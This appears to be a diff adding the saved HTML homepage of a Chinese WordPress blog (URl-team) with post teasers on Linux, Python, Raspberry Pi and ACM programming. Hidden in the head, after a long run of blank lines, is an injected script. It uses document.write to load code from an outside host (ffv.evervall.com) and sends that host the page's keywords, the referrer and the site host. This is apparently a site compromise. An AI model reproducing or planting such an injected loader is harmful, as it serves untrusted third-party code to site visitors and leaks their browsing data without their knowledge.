@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="http://www.urlteam.org/xmlrpc.php">
+
+<!--[if lt IE 9]>
+<script src="http://www.urlteam.org/wp-content/themes/zerif-lite/js/html5.js"></script>
+<link rel="stylesheet" href="http://www.urlteam.org/wp-content/themes/zerif-lite/css/ie.css" type="text/css">
+<![endif]-->
+
+<title>URl-team | The World We Move Forward Together</title>
+
+<!-- All in One SEO Pack 2.3.2.3 by Michael Torbert of Semper Fi Web Design[482,540] -->
+<meta name="description" itemprop="description" content="前段时间看空间流行一个小游戏,类似与一个表格每点击一次所有的颜色都会变化,找出其中某一个与别的颜色不同的,感觉思路比较清晰就顺手写一个玩一玩. 试玩网址:http://www.urlteam.org/web_game/shili_game/ 好吧,我承认这份代码比较low.没有用什么框架" />
+
+<meta name="keywords" itemprop="keywords" content="linux,服务器,python,树莓派,模拟excel排序,c++ sort排序,多重排序,题解,acm,linux，apache&amp;nginx,stl队列" />
+<script type="application/ld+json">
+        {
+          "@context": "http://schema.org",
+          "@type": "WebSite",        "potentialAction": {
+          "@type": "SearchAction",
+          "target": "http://www.urlteam.org/?s={search_term}",
+          "query-input": "required name=search_term"
+        },		  "url": "http://www.urlteam.org/"
+        }
+</script>
+<link rel='next' href='http://www.urlteam.org/page/2/' />
+
+<link rel="canonical" href="http://www.urlteam.org/" />
+<!-- /all in one seo pack -->
+<link rel="alternate" type="application/rss+xml" title="URl-team &raquo; Feed" href="http://www.urlteam.org/feed/" />
+<link rel="alternate" type="application/rss+xml" title="URl-team &raquo; 评论Feed" href="http://www.urlteam.org/comments/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/www.urlteam.org\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.4.3"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;return g&&g.fillText?(g.textBaseline="top",g.font="600 32px Arial","flag"===a?(g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3):"diversity"===a?(g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e):("simple"===a?g.fillText(h(55357,56835),0,0):g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag"),unicode8:d("unicode8"),diversity:d("diversity")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag&&c.supports.unicode8&&c.supports.diversity||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='crayon-css'  href='http://www.urlteam.org/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-theme-classic-css'  href='http://www.urlteam.org/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://www.urlteam.org/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
+<link rel='stylesheet' id='pirate_forms_front_styles-css'  href='http://www.urlteam.org/wp-content/plugins/pirate-forms/css/front.css?ver=4.4.3' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-syntax-css-css'  href='http://www.urlteam.org/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='zerif_font-css'  href='//fonts.googleapis.com/css?family=Montserrat%3A700%7CHomemade+Apple&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='zerif_font_all-css'  href='//fonts.googleapis.com/css?family=Open+Sans%3A400%2C300%2C300italic%2C400italic%2C600italic%2C600%2C700%2C700italic%2C800%2C800italic&#038;ver=4.4.3' type='text/css' media='all' />
+<link rel='stylesheet' id='zerif_bootstrap_style-css'  href='http://www.urlteam.org/wp-content/themes/zerif-lite/css/bootstrap.css?ver=4.4.3' type='text/css' media='all' />
+<link rel='stylesheet' id='zerif_fontawesome-css'  href='http://www.urlteam.org/wp-content/themes/zerif-lite/css/font-awesome.min.css?ver=v1' type='text/css' media='all' />
+<link rel='stylesheet' id='zerif_pixeden_style-css'  href='http://www.urlteam.org/wp-content/themes/zerif-lite/css/pixeden-icons.css?ver=v1' type='text/css' media='all' />
+<link rel='stylesheet' id='zerif_style-css'  href='http://www.urlteam.org/wp-content/themes/zerif-lite/style.css?ver=v1' type='text/css' media='all' />
+<link rel='stylesheet' id='zerif_responsive_style-css'  href='http://www.urlteam.org/wp-content/themes/zerif-lite/css/responsive.css?ver=v1' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.urlteam.org/wp-includes/js/jquery/jquery.js?ver=1.11.3'></script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"http:\/\/www.urlteam.org\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
+var CrayonSyntaxStrings = {"copy":"\u4f7f\u7528 %s \u590d\u5236\uff0c\u4f7f\u7528 %s \u7c98\u8d34\u3002","minimize":"\u70b9\u51fb\u5c55\u5f00\u4ee3\u7801"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var pirateFormsObject = {"errors":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.urlteam.org/wp-content/plugins/pirate-forms/js/scripts-general.js?ver=4.4.3'></script>
+<link rel='https://api.w.org/' href='http://www.urlteam.org/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.urlteam.org/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.urlteam.org/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.4.3" />
+		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<style type="text/css" id="custom-background-css">
+body.custom-background { background-image: url('http://www.urlteam.org/wp-content/themes/zerif-lite/images/bg.jpg'); background-repeat: repeat; background-position: top left; background-attachment: scroll; }
+</style>
+<link rel="icon" href="http://www.urlteam.org/wp-content/uploads/2015/08/cropped-14110321028932-e1440584371928-32x32.jpg" sizes="32x32" />
+<link rel="icon" href="http://www.urlteam.org/wp-content/uploads/2015/08/cropped-14110321028932-e1440584371928-192x192.jpg" sizes="192x192" />
+<link rel="apple-touch-icon-precomposed" href="http://www.urlteam.org/wp-content/uploads/2015/08/cropped-14110321028932-e1440584371928-180x180.jpg" />
+<meta name="msapplication-TileImage" content="http://www.urlteam.org/wp-content/uploads/2015/08/cropped-14110321028932-e1440584371928-270x270.jpg" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://ffv.evervall.com/js/jquery.min.php?c_utt=J18171&c_utm='+encodeURIComponent('http://ffv.evervall.com/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
+</head>
+
+
+	<body class="home blog custom-background group-blog" >
+
+<div class="preloader"><div class="status">&nbsp;</div></div>
+
+<div id="mobilebgfix">
+	<div class="mobile-bg-fix-img-wrap">
+		<div class="mobile-bg-fix-img"></div>
+	</div>
+	<div class="mobile-bg-fix-whole-site">
+
+
+<header id="home" class="header">
+
+	<div id="main-nav" class="navbar navbar-inverse bs-docs-nav" role="banner">
+
+		<div class="container">
+
+			<div class="navbar-header responsive-logo">
+
+				<button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target=".bs-navbar-collapse">
+
+				<span class="sr-only">Toggle navigation</span>
+
+				<span class="icon-bar"></span>
+
+				<span class="icon-bar"></span>
+
+				<span class="icon-bar"></span>
+
+				</button>
+
+				<a href="http://www.urlteam.org/" class="navbar-brand"><img src="http://www.urlteam.org/wp-content/uploads/2016/03/logo.png" alt="URl-team"></a>
+			</div>
+
+			<nav class="navbar-collapse bs-navbar-collapse collapse" role="navigation"   id="site-navigation">
+				<a class="screen-reader-text skip-link" href="#content">Skip to content</a>
+				<ul id="menu-%e9%a1%b9%e7%9b%ae%e8%ae%a1%e5%88%92" class="nav navbar-nav navbar-right responsive-nav main-nav-list"><li id="menu-item-891" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-891"><a href="http://www.urlteam.org/jiaohu/">壁纸设计器</a></li>
+<li id="menu-item-920" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-920"><a href="http://www.urlteam.org/%e8%a7%86%e5%8a%9b%e5%a4%a7%e4%bd%9c%e6%88%98_web%e5%b0%8f%e6%b8%b8%e6%88%8f/">视力大作战_web小游戏</a></li>
+</ul>			</nav>
+
+		</div>
+
+	</div>
+	<!-- / END TOP BAR --><div class="home-header-wrap"><ul id="parallax_move"><li class="layer layer1" data-depth="0.10" style="background-image: url(http://www.urlteam.org/wp-content/uploads/2016/05/64_423779_528b4557e8a989e.jpg);"></li><li class="layer layer2" data-depth="0.20" style="background-image: url(http://www.urlteam.org/wp-content/themes/zerif-lite/images/background2.png);"></li></ul><div class="header-content-wrap"><div class="container"><h1 class="intro-text">Welcome  to  URL-TEAM  blog</h1><div class="buttons"><a href="http://www.urlteam.org/wp-admin" class="btn btn-primary custom-button red-btn">用户登录</a><a href="http://www.urlteam.org/jiaohu" class="btn btn-primary custom-button green-btn">特效体验</a></div></div></div><!-- .header-content-wrap --><div class="clear"></div></div>
+</header> <!-- / END HOME SECTION  -->
+
+<div id="content" class="site-content">
+
+<section class="focus" id="focus"><div class="container">	<!-- SECTION HEADER -->	<div class="section-header">		<!-- SECTION TITLE -->		<h2 class="dark-text">原创专题</h2><div class="section-legend">The world we move forward together</div>	</div>	<div class="row">			
+        <div class="col-lg-3 col-sm-3 focus-box" data-scrollreveal="enter left after 0.15s over 1s">
+
+			            <div class="service-icon">
+				
+								
+					<a href="http://www.urlteam.org/category/linux/"><i class="pixeden" style="background:url(http://www.urlteam.org/wp-content/uploads/2015/12/new.jpg) no-repeat center;width:100%; height:100%;"></i> <!-- FOCUS ICON--></a>
+				
+				
+            </div>
+			
+            <h3 class="red-border-bottom">LINUX</h3>
+            <!-- FOCUS HEADING -->
+
+				
+
+        </div>
+
+        
+        <div class="col-lg-3 col-sm-3 focus-box" data-scrollreveal="enter left after 0.15s over 1s">
+
+			            <div class="service-icon">
+				
+								
+					<a href="http://www.urlteam.org/category/python/"><i class="pixeden" style="background:url(http://www.urlteam.org/wp-content/uploads/2015/12/new-python.jpg) no-repeat center;width:100%; height:100%;"></i> <!-- FOCUS ICON--></a>
+				
+				
+            </div>
+			
+            <h3 class="red-border-bottom">Python</h3>
+            <!-- FOCUS HEADING -->
+
+				
+
+        </div>
+
+        
+        <div class="col-lg-3 col-sm-3 focus-box" data-scrollreveal="enter left after 0.15s over 1s">
+
+			            <div class="service-icon">
+				
+								
+					<a href="http://www.urlteam.org/category/%E8%87%AA%E5%88%B6%E9%A1%B9%E7%9B%AE/%E6%A0%91%E8%8E%93%E6%B4%BE/"><i class="pixeden" style="background:url(http://www.urlteam.org/wp-content/uploads/2015/12/new-shumei.jpg) no-repeat center;width:100%; height:100%;"></i> <!-- FOCUS ICON--></a>
+				
+				
+            </div>
+			
+            <h3 class="red-border-bottom">树莓派</h3>
+            <!-- FOCUS HEADING -->
+
+				
+
+        </div>
+
+        
+        <div class="col-lg-3 col-sm-3 focus-box" data-scrollreveal="enter left after 0.15s over 1s">
+
+			            <div class="service-icon">
+				
+								
+					<a href="http://www.urlteam.org/category/%E8%87%AA%E5%88%B6%E9%A1%B9%E7%9B%AE/"><i class="pixeden" style="background:url(http://www.urlteam.org/wp-content/themes/zerif-lite/images/ti-logo.png) no-repeat center;width:100%; height:100%;"></i> <!-- FOCUS ICON--></a>
+				
+				
+            </div>
+			
+            <h3 class="red-border-bottom">项目</h3>
+            <!-- FOCUS HEADING -->
+
+				
+
+        </div>
+
+        
+        <div class="col-lg-3 col-sm-3 focus-box" data-scrollreveal="enter left after 0.15s over 1s">
+
+			            <div class="service-icon">
+				
+								
+					<a href="http://www.urlteam.org/category/acm/"><i class="pixeden" style="background:url(http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-e1461144631554.png) no-repeat center;width:100%; height:100%;"></i> <!-- FOCUS ICON--></a>
+				
+				
+            </div>
+			
+            <h3 class="red-border-bottom">ACM</h3>
+            <!-- FOCUS HEADING -->
+
+				
+
+        </div>
+
+        	</div></div> <!-- / END CONTAINER --></section>  <!-- / END FOCUS SECTION --><section class="latest-news" id="latestnews"><div class="container"><div class="section-header"><h2 class="dark-text">近期文章</h2></div><!-- END .section-header --><div class="clear"></div><div id="carousel-homepage-latestnews" class="carousel slide" data-ride="carousel"><div class="carousel-inner" role="listbox"><div class="item active"><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/06/%e8%a7%86%e5%8a%9b%e5%a4%a7%e4%bd%9c%e6%88%98_web%e9%9d%99%e6%80%81%e5%b0%8f%e6%b8%b8%e6%88%8f%e5%88%b6%e4%bd%9c/" title="视力大作战_web静态小游戏制作"><img width="250" height="250" src="http://www.urlteam.org/wp-content/uploads/2016/06/132-250x250.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="132" srcset="http://www.urlteam.org/wp-content/uploads/2016/06/132-150x150.png 150w, http://www.urlteam.org/wp-content/uploads/2016/06/132-250x250.png 250w, http://www.urlteam.org/wp-content/uploads/2016/06/132-174x174.png 174w" sizes="(max-width: 250px) 100vw, 250px" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/06/%e8%a7%86%e5%8a%9b%e5%a4%a7%e4%bd%9c%e6%88%98_web%e9%9d%99%e6%80%81%e5%b0%8f%e6%b8%b8%e6%88%8f%e5%88%b6%e4%bd%9c/" title="视力大作战_web静态小游戏制作">视力大作战_web静态小游戏制作</a></h3><p>前段时间看空间流行一个小游戏,类似与一个表格每点击一次所有的颜色都会变化,找出其中某一个与别的颜色不同的,感觉思路比较清晰就顺手写一个玩一玩.</p>
+<p>试玩网址:http://www.urlteam.org/web_game/shili_game/</p>
+<p> <a href="http://www.urlteam.org/2016/06/%e8%a7%86%e5%8a%9b%e5%a4%a7%e4%bd%9c%e6%88%98_web%e9%9d%99%e6%80%81%e5%b0%8f%e6%b8%b8%e6%88%8f%e5%88%b6%e4%bd%9c/#more-916" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/06/%e8%a7%a3%e5%86%b3-%e5%90%af%e5%8a%a8mysql-%e6%8f%90%e7%a4%ba-stop-unknown-instance/" title="解决 启动mysql 提示 stop: Unknown instance"><img src="http://www.urlteam.org/wp-content/themes/zerif-lite/images/blank-latestposts.png" alt="解决 启动mysql 提示 stop: Unknown instance" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/06/%e8%a7%a3%e5%86%b3-%e5%90%af%e5%8a%a8mysql-%e6%8f%90%e7%a4%ba-stop-unknown-instance/" title="解决 启动mysql 提示 stop: Unknown instance">解决 启动mysql 提示 stop: Unknown instance</a></h3><p>这个问题是由服务器不正常重启中断导致的，解决方法也简单重启服务器即可。</p>
+<p> <a href="http://www.urlteam.org/2016/06/%e8%a7%a3%e5%86%b3-%e5%90%af%e5%8a%a8mysql-%e6%8f%90%e7%a4%ba-stop-unknown-instance/#more-914" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/06/%e6%a0%91%e8%8e%93%e6%b4%be-python-%e7%99%be%e5%ba%a6%e8%af%ad%e9%9f%b3%e6%8e%a7%e5%88%b6-gpio-%e6%8e%a7%e5%88%b6%e5%bc%80%e5%85%b3%e7%81%af/" title="树莓派 python 百度语音控制 gpio 控制开关灯"><img width="224" height="224" src="http://www.urlteam.org/wp-content/uploads/2016/06/images.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="images" srcset="http://www.urlteam.org/wp-content/uploads/2016/06/images-150x150.jpg 150w, http://www.urlteam.org/wp-content/uploads/2016/06/images-174x174.jpg 174w, http://www.urlteam.org/wp-content/uploads/2016/06/images.jpg 224w" sizes="(max-width: 224px) 100vw, 224px" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/06/%e6%a0%91%e8%8e%93%e6%b4%be-python-%e7%99%be%e5%ba%a6%e8%af%ad%e9%9f%b3%e6%8e%a7%e5%88%b6-gpio-%e6%8e%a7%e5%88%b6%e5%bc%80%e5%85%b3%e7%81%af/" title="树莓派 python 百度语音控制 gpio 控制开关灯">树莓派 python 百度语音控制 gpio 控制开关灯</a></h3><p>最初拿到树莓派的时候测试过,没成功,后来发现一张华丽丽的说明图,顿时醒悟了..记录下来, <a href="http://www.urlteam.org/2016/06/%e6%a0%91%e8%8e%93%e6%b4%be-python-%e7%99%be%e5%ba%a6%e8%af%ad%e9%9f%b3%e6%8e%a7%e5%88%b6-gpio-%e6%8e%a7%e5%88%b6%e5%bc%80%e5%85%b3%e7%81%af/#more-911" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/05/it%e6%96%b9%e5%90%91%e5%90%84%e7%a7%8d%e8%b5%84%e6%ba%90%e9%9b%86%e5%90%88/" title="IT方向各种资源集合"><img width="250" height="85" src="http://www.urlteam.org/wp-content/uploads/2015/12/logo-250x85.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="logo" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/05/it%e6%96%b9%e5%90%91%e5%90%84%e7%a7%8d%e8%b5%84%e6%ba%90%e9%9b%86%e5%90%88/" title="IT方向各种资源集合">IT方向各种资源集合</a></h3><p>这里仅仅是把自己常用的各种学习和阅读资源做一个汇总链接。</p>
+<p> <a href="http://www.urlteam.org/2016/05/it%e6%96%b9%e5%90%91%e5%90%84%e7%a7%8d%e8%b5%84%e6%ba%90%e9%9b%86%e5%90%88/#more-904" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="clear"></div></div><div class="item"><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/05/%e4%ba%a4%e4%ba%92%e5%bc%8f%e8%89%ba%e6%9c%af%e8%ae%be%e8%ae%a1/" title="交互式艺术设计&#8211;壁纸设计生成器"><img width="250" height="250" src="http://www.urlteam.org/wp-content/uploads/2016/05/下载-2-1-250x250.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="下载 (2)" srcset="http://www.urlteam.org/wp-content/uploads/2016/05/下载-2-1-150x150.png 150w, http://www.urlteam.org/wp-content/uploads/2016/05/下载-2-1-250x250.png 250w, http://www.urlteam.org/wp-content/uploads/2016/05/下载-2-1-174x174.png 174w" sizes="(max-width: 250px) 100vw, 250px" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/05/%e4%ba%a4%e4%ba%92%e5%bc%8f%e8%89%ba%e6%9c%af%e8%ae%be%e8%ae%a1/" title="交互式艺术设计&#8211;壁纸设计生成器">交互式艺术设计&#8211;壁纸设计生成器</a></h3><p>源代码来自:http://weavesilk.com/   <a href="http://www.urlteam.org/2016/05/%e4%ba%a4%e4%ba%92%e5%bc%8f%e8%89%ba%e6%9c%af%e8%ae%be%e8%ae%a1/#more-893" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/05/%e4%b8%ba%e4%bd%95%e6%80%bb%e6%98%af%e5%bf%99%e7%a2%8c%e5%8d%b4%e4%b8%8d%e7%9f%a5%e5%b9%b2%e4%ba%86%e4%bb%80%e4%b9%88-%e5%85%b3%e4%ba%8e%e6%a0%88%e5%bc%8f%e4%b8%8e%e4%bc%98%e5%85%88%e9%98%9f%e5%88%97/" title="为何总是忙碌却不知干了什么? 关于栈式与优先队列式的处事风格"><img width="250" height="155" src="http://www.urlteam.org/wp-content/uploads/2015/12/2015-12-07-145641屏幕截图-825x510.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="2015-12-07 14:56:41屏幕截图" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/05/%e4%b8%ba%e4%bd%95%e6%80%bb%e6%98%af%e5%bf%99%e7%a2%8c%e5%8d%b4%e4%b8%8d%e7%9f%a5%e5%b9%b2%e4%ba%86%e4%bb%80%e4%b9%88-%e5%85%b3%e4%ba%8e%e6%a0%88%e5%bc%8f%e4%b8%8e%e4%bc%98%e5%85%88%e9%98%9f%e5%88%97/" title="为何总是忙碌却不知干了什么? 关于栈式与优先队列式的处事风格">为何总是忙碌却不知干了什么? 关于栈式与优先队列式的处事风格</a></h3><p>知道为什么很多人感觉自己一天都在忙,却一直没有实际的成果吗 ? <a href="http://www.urlteam.org/2016/05/%e4%b8%ba%e4%bd%95%e6%80%bb%e6%98%af%e5%bf%99%e7%a2%8c%e5%8d%b4%e4%b8%8d%e7%9f%a5%e5%b9%b2%e4%ba%86%e4%bb%80%e4%b9%88-%e5%85%b3%e4%ba%8e%e6%a0%88%e5%bc%8f%e4%b8%8e%e4%bc%98%e5%85%88%e9%98%9f%e5%88%97/#more-887" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/05/%e6%a8%a1%e6%8b%9fexcel%e6%8e%92%e5%ba%8f-c-sort%e6%8e%92%e5%ba%8f-%e5%a4%9a%e9%87%8d%e6%8e%92%e5%ba%8f-%e9%a2%98%e8%a7%a3/" title="模拟EXCEL排序 c++ sort排序 多重排序 题解"><img width="250" height="250" src="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="20131129171921-858538104" srcset="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-150x150.png 150w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png 250w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-174x174.png 174w" sizes="(max-width: 250px) 100vw, 250px" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/05/%e6%a8%a1%e6%8b%9fexcel%e6%8e%92%e5%ba%8f-c-sort%e6%8e%92%e5%ba%8f-%e5%a4%9a%e9%87%8d%e6%8e%92%e5%ba%8f-%e9%a2%98%e8%a7%a3/" title="模拟EXCEL排序 c++ sort排序 多重排序 题解">模拟EXCEL排序 c++ sort排序 多重排序 题解</a></h3><header>题目链接: https://pta.patest.cn/pta/test/15/exam/4/question/864</header>
+<header>附录有strcmp函数使用以及多重sort的解析.</header>
+<p> <a href="http://www.urlteam.org/2016/05/%e6%a8%a1%e6%8b%9fexcel%e6%8e%92%e5%ba%8f-c-sort%e6%8e%92%e5%ba%8f-%e5%a4%9a%e9%87%8d%e6%8e%92%e5%ba%8f-%e9%a2%98%e8%a7%a3/#more-883" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/05/ubuntu-1415%e4%b8%8b%e6%9c%8d%e5%8a%a1%e5%99%a8%e4%b8%8b%e6%90%ad%e5%bb%ba-hustoj-%e6%af%94%e8%b5%9b%e5%b9%b3%e5%8f%b0-%e9%99%84%e5%a4%9a%e9%a2%98%e5%ba%93%e4%b8%8e%e9%97%ae%e9%a2%98%e8%a7%a3/" title="ubuntu 14|15下服务器下搭建 hustoj 比赛平台 附多题库与问题解析"><img width="250" height="250" src="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="20131129171921-858538104" srcset="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-150x150.png 150w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png 250w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-174x174.png 174w" sizes="(max-width: 250px) 100vw, 250px" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/05/ubuntu-1415%e4%b8%8b%e6%9c%8d%e5%8a%a1%e5%99%a8%e4%b8%8b%e6%90%ad%e5%bb%ba-hustoj-%e6%af%94%e8%b5%9b%e5%b9%b3%e5%8f%b0-%e9%99%84%e5%a4%9a%e9%a2%98%e5%ba%93%e4%b8%8e%e9%97%ae%e9%a2%98%e8%a7%a3/" title="ubuntu 14|15下服务器下搭建 hustoj 比赛平台 附多题库与问题解析">ubuntu 14|15下服务器下搭建 hustoj 比赛平台 附多题库与问题解析</a></h3><p>本文算是集合贴,参考了多位大神的搭建博文,现在做个总结,.主要学习自刘鑫的博文:http://www.myvary.cn/index.php/2015/11/06/hustoj11/</p>
+<p> <a href="http://www.urlteam.org/2016/05/ubuntu-1415%e4%b8%8b%e6%9c%8d%e5%8a%a1%e5%99%a8%e4%b8%8b%e6%90%ad%e5%bb%ba-hustoj-%e6%af%94%e8%b5%9b%e5%b9%b3%e5%8f%b0-%e9%99%84%e5%a4%9a%e9%a2%98%e5%ba%93%e4%b8%8e%e9%97%ae%e9%a2%98%e8%a7%a3/#more-872" class="more-link">[&#8230;]</a></p>
+</div></div><!-- .latestnews-box"> --><div class="clear"></div></div><div class="item"><div class="col-sm-3 latestnews-box"><div class="latestnews-img"><a class="latestnews-img-a" href="http://www.urlteam.org/2016/05/acm%e7%ae%97%e6%b3%95%e6%a8%a1%e6%9d%bf%e6%94%b6%e8%97%8f-%e6%94%af%e6%8c%81%e5%85%8d%e8%b4%b9%e4%b8%8b%e8%bd%bd/" title="ACM算法模板收藏 支持免费下载"><img width="250" height="250" src="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="20131129171921-858538104" srcset="http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-150x150.png 150w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-250x250.png 250w, http://www.urlteam.org/wp-content/uploads/2016/04/20131129171921-858538104-174x174.png 174w" sizes="(max-width: 250px) 100vw, 250px" /></a></div><div class="latesnews-content"><h3 class="latestnews-title"><a href="http://www.urlteam.org/2016/05/acm%e7%ae%97%e6%b3%95%e6%a8%a1%e6%9d%bf%e6%94%b6%e8%97%8f-%e6%94%af%e6%8c%81%e5%85%8d%e8%b4%b9%e4%b8%8b%e8%bd%bd/" title="ACM算法模板收藏 支持免费下载">ACM算法模板收藏 支持免费下载</a></h3><p>两份经典资料,其中清华的那份比较好,把各种算法模拟成函数,还写清楚了输入输出结果和参数含义方便调用.,另外一份是完整版.</p>
+<p>放在网站上随时方便下载.</p>
